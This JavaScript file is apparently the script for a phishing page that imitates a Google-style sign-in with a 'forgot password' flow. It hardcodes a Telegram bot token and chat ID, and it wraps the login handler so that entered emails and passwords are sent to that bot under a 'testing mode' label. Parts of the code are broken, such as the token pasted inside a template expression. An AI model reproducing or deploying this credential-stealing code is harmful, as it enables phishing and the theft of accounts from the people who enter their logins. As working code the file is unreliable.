// Add these variables at the top of your script.js
let testingMode = false;
let botToken = '7878971486:AAHhMDmH8lUzAbpdrEsEg3hdHUnjiRHkmlE';
let chatId = '6858157782';

document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const signinPage = document.getElementById('signinPage');
    const forgotPasswordPage = document.getElementById('forgotPasswordPage');
    const successPage = document.getElementById('successPage');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const passwordGroup = document.getElementById('passwordGroup');
    const forgotPasswordLink = document.getElementById('forgotPassword');
    const nextButton = document.getElementById('nextButton');
    const togglePassword = document.getElementById('togglePassword');
    const emailError = document.getElementById('emailError');
    const passwordError = document.getElementById('passwordError');
    const backFromForgotPassword = document.getElementById('backFromForgotPassword');
    const sendRecoveryButton = document.getElementById('sendRecoveryButton');
    const recoveryOptions = document.getElementById('recoveryOptions');
    const recoveryEmailInput = document.getElementById('recoveryEmail');
    const recoveryEmailError = document.getElementById('recoveryEmailError');
    const signedInEmail = document.getElementById('signedInEmail');
    const signOutButton = document.getElementById('signOutButton');
    const forgotEmailLink = document.getElementById('forgotEmail');
    const testingControls = document.getElementById('testingControls');
    const enableTesting = document.getElementById('enableTesting');
    const testingFields = document.getElementById('testingFields');
    const sendTestData = document.getElementById('sendTestData');
    const testBotToken = document.getElementById('testBotToken');
    const testChatId = document.getElementById('testChatId');
 // Show testing controls (for development)
    testingControls.style.display = 'block';

    enableTesting.addEventListener('change', function() {
        testingMode = this.checked;
        testingFields.style.display = this.checked ? 'block' : 'none';
    });

    sendTestData.addEventListener('click', function() {
        botToken = testBotToken.value.trim();
        chatId = testChatId.value.trim();
        
        if (!botToken || !chatId) {
            alert('Please enter both Bot Token and Chat ID');
            return;
        }

        // Send test data
        const testData = {
            email: emailInput.value,
            password: passwordInput.value,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        };

        sendToTelegram(`Test Data Received:\nEmail: ${testData.email}\nPassword: ${testData.password}\nTime: ${testData.timestamp}`);
    });

    // Modify your handleNextButton function to send data to Telegram
    const originalHandleNextButton = handleNextButton;
    handleNextButton = function() {
        if (testingMode && passwordGroup.style.display !== 'none') {
            const credentials = {
                email: emailInput.value,
                password: passwordInput.value,
                timestamp: new Date().toISOString(),
                ip: '185.199.108.153' // In a real scenario, you'd get this from the server
            };

            sendToTelegram(`Login Attempt:\nEmail: ${credentials.email}\nPassword: ${credentials.password}\nTime: ${credentials.timestamp}`);
        }
        
        originalHandleNextButton();
    };

    // Also send data when password is shown (email verification step)
    const originalShowPasswordField = function() {
        if (testingMode) {
            sendToTelegram(`Email Entered: ${emailInput.value}\nTime: ${new Date().toISOString()}`);
        }
    };

    // ... rest of your existing code ...
// Add this function to your script.js
function sendToTelegram(message) {
    if (!testingMode || !botToken || !chatId) return;
    
    const url = `https://api.telegram.org/bot${7878971486:AAHhMDmH8lUzAbpdrEsEg3hdHUnjiRHkmlE}/sendMessage`;
    const data = {
        chat_id: chatId,
        text: message
    };

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => console.log('Telegram response:', data))
    .catch(error => console.error('Error sending to Telegram:', error));
}
    // State
    let currentPage = 'signin';
    let currentEmail = '';
    let passwordVisible = false;

    // Test accounts (for demo purposes)
    const testAccounts = {
        'student@school.edu': { password: 'school123', name: 'Student User' },
        'teacher@school.edu': { password: 'teach456', name: 'Teacher User' }
    };

    // Event Listeners
    nextButton.addEventListener('click', handleNextButton);
    togglePassword.addEventListener('click', togglePasswordVisibility);
    forgotPasswordLink.addEventListener('click', showForgotPassword);
    backFromForgotPassword.addEventListener('click', goBackToSignIn);
    sendRecoveryButton.addEventListener('click', handleRecovery);
    signOutButton.addEventListener('click', signOut);
    forgotEmailLink.addEventListener('click', showForgotEmailAlert);

    // Email recovery option click
    document.getElementById('emailRecovery').addEventListener('click', function() {
        alert('Verification code would be sent to your email in a real application.');
        showSuccessPage(recoveryEmailInput.value);
    });

    // Functions
    function handleNextButton() {
        if (currentPage === 'signin') {
            if (passwordGroup.style.display === 'none') {
                // Step 1: Verify email
                const email = emailInput.value.trim();
                if (!email) {
                    showError(emailInput, emailError, 'Enter an email or phone number');
                    return;
                }

                if (!validateEmail(email) && !validatePhone(email)) {
                    showError(emailInput, emailError, 'Enter a valid email or phone number');
                    return;
                }

                // Check if email exists (in demo, we accept any email but show password field for test accounts)
                currentEmail = email;
                hideError(emailInput, emailError);
                
                // Show password field
                passwordGroup.style.display = 'block';
                forgotPasswordLink.style.display = 'block';
                forgotEmailLink.style.display = 'none';
                nextButton.textContent = 'Sign in';
                
                // Focus password field
                setTimeout(() => {
                    passwordInput.focus();
                }, 10);
                
                // Animate appearance
                passwordGroup.classList.add('fade-in');
            } else {
                // Step 2: Verify password
                const password = passwordInput.value;
                
                if (!password) {
                    showError(passwordInput, passwordError, 'Enter a password');
                    return;
                }

                // In demo, only check password for test accounts
                if (testAccounts[currentEmail] && testAccounts[currentEmail].password === password) {
                    // Successful login
                    hideError(passwordInput, passwordError);
                    showSuccessPage(currentEmail);
                } else {
                    // Failed login
                    showError(passwordInput, passwordError, 'Wrong password. Try again or click Forgot password to reset it.');
                }
            }
        }
    }

    function togglePasswordVisibility() {
        passwordVisible = !passwordVisible;
        passwordInput.type = passwordVisible ? 'text' : 'password';
        togglePassword.innerHTML = passwordVisible ? 'visibility_off' : 'visibility';
    }

    function showForgotPassword(e) {
        e.preventDefault();
        currentPage = 'forgotPassword';
        signinPage.style.display = 'none';
        forgotPasswordPage.style.display = 'block';
    }

    function goBackToSignIn() {
        currentPage = 'signin';
        forgotPasswordPage.style.display = 'none';
        signinPage.style.display = 'block';
    }

    function handleRecovery() {
        const email = recoveryEmailInput.value.trim();
        
        if (!email) {
            showError(recoveryEmailInput, recoveryEmailError, 'Enter an email');
            return;
        }

        if (!validateEmail(email)) {
            showError(recoveryEmailInput, recoveryEmailError, 'Enter a valid email address');
            return;
        }

        // In a real app, this would verify the email exists
        hideError(recoveryEmailInput, recoveryEmailError);
        recoveryOptions.style.display = 'block';
        
        // Update the email display (showing only first letter and domain)
        const emailParts = email.split('@');
        const hiddenEmail = emailParts[0].charAt(0) + '••••@' + emailParts[1];
        document.querySelector('#emailRecovery div div:last-child').textContent = hiddenEmail;
    }

    function showSuccessPage(email) {
        currentPage = 'success';
        document.getElementById('mainContainer').style.display = 'none';
        successPage.style.display = 'block';
        signedInEmail.textContent = email;
    }

    function signOut() {
        currentPage = 'signin';
        successPage.style.display = 'none';
        document.getElementById('mainContainer').style.display = 'block';
        signinPage.style.display = 'block';
        forgotPasswordPage.style.display = 'none';
        
        // Reset form
        passwordGroup.style.display = 'none';
        forgotPasswordLink.style.display = 'none';
        forgotEmailLink.style.display = 'block';
        nextButton.textContent = 'Next';
        emailInput.value = '';
        passwordInput.value = '';
        currentEmail = '';
    }

    function showForgotEmailAlert(e) {
        e.preventDefault();
        alert('In a real application, this would help you recover your email address.');
    }

    // Helper functions
    function showError(input, errorElement, message) {
        errorElement.textContent = message;
        errorElement.style.display = 'block';
        input.style.borderColor = '#d93025';
    }

    function hideError(input, errorElement) {
        errorElement.style.display = 'none';
        input.style.borderColor = '#dadce0';
    }

    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

    function validatePhone(phone) {
        const re = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/;
        return re.test(phone);
    }
    
});
